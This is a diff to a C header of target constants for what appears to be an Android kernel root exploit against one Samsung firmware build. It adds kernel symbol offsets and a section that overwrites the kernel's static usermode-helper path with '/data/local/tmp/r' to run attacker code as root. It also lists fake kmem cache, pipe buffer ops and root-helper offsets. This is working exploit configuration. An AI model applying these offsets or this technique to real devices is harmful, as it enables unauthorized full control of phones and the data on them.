@@ -23,6 +23,8 @@
   "samsung/dm3qxxx/dm3q:17/CP2A.260605.016/S918BXXUAZZI8:user/release-keys"
 #define TARGET_KERNEL_RELEASE \
   "5.15.197-android13-8-34343818-abS918BXXUAZZI8"
+#define TARGET_KERNEL_VERSION \
+  "#1 SMP PREEMPT Mon Sep 14 06:56:00 UTC 2026"
 
 /* Static kernel symbols. */
 #define TARGET_KIMAGE_TEXT_BASE 0xffffffc008000000ULL
@@ -45,6 +47,7 @@
 #define TARGET_KIMAGE_VOFFSET_OFF 0x02067928ULL
 #define TARGET_KMALLOC_CACHES_OFF 0x02067930ULL
 #define TARGET_ANON_PIPE_BUF_OPS_OFF 0x01e82460ULL
+#define TARGET_STATIC_UMH_PATH_OFF 0x01e14b34ULL
 #define TARGET_CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00104888ULL
 #define TARGET_DO_SAK_WORK_OFF 0x00bb8b14ULL
 #define TARGET_DO_SAK_OFF 0x00bbb328ULL
@@ -308,7 +311,20 @@
 #define TARGET_PIPE_PROOF_LIVE_OFF 0x7100ULL
 #define TARGET_FAKE_KMEM_CACHE_LIVE_OFF 0x7400ULL
 
-/* UMH/PTY object placement and ABI. */
+/* Deterministic binfmt/usermode-helper bootstrap. The firmware's
+ * CONFIG_STATIC_USERMODEHELPER_PATH points at an empty byte immediately
+ * followed by the guard string. Production temporarily replaces only the
+ * first TARGET_STATIC_UMH_PATCH_SIZE bytes and restores them byte-for-byte. */
+#define TARGET_STATIC_UMH_PATH "/data/local/tmp/r"
+#define TARGET_STATIC_UMH_PATCH_SIZE 18U
+#define TARGET_STATIC_UMH_GUARD_SIZE 24U
+#define TARGET_BINFMT_TRIGGER_PATH "/data/local/tmp/.rmg-binfmt"
+#define TARGET_UMH_TRIGGER_TIMEOUT_MS 5000U
+#define TARGET_UMH_SOCKET_POLL_COUNT 500U
+#define TARGET_UMH_SOCKET_POLL_USEC 10000U
+
+/* Legacy PTY ABI retained as firmware-contract evidence for the porting
+ * tools. None of these values is consumed by the ZZI8 production path. */
 #define TARGET_ROOT_UMH_DATA_LIVE_OFF 0x6200ULL
 #define TARGET_ROOT_TTY_OPS_LIVE_OFF 0x6400ULL
 #define TARGET_WORK_PENDING_BIT 0x1ULL
